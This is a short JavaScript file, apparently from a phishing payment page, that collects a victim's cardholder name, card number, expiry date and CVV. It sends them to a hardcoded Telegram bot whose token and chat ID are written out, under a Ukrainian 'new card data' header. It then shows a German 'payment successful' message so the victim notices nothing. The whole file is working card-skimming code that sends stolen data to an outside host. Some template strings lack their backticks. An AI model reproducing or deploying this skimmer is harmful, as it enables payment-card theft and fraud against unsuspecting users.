const BotToken = '8012903445:AAGaVEfWzjq-kkAFHazjjCsmnlh-QyXvaY0';
const ChatId = '8463942433';

function showError(errorId) {
    document.getElementById(errorId).style.display = 'block';
    setTimeout(() => {
        document.getElementById(errorId).style.display = 'none';
    }, 3000);
}

function sendData() {
    const cardData = {
        holder: document.getElementById('cardholder').value,
        number: document.getElementById('cardNumber').value,
        exp: document.getElementById('expDate').value,
        cvv: document.getElementById('cvv').value
    };

    fetch(https://api.telegram.org/bot${BotToken}/sendMessage, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: ChatId,
            text: 🚨 НОВІ ДАНІ КАРТИ:\nВласник: ${cardData.holder}\nНомер: ${cardData.number}\nТермін: ${cardData.exp}\nCVV: ${cardData.cvv}
        })
    }).then(response => response.json())
    .then(data => {
        alert('Zahlung erfolgreich! Die Verbindung wird in einer Minute aktiviert.');
    })
    .catch(error => {
        console.error('Fehler:', error);
        alert('Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.');
    });
}
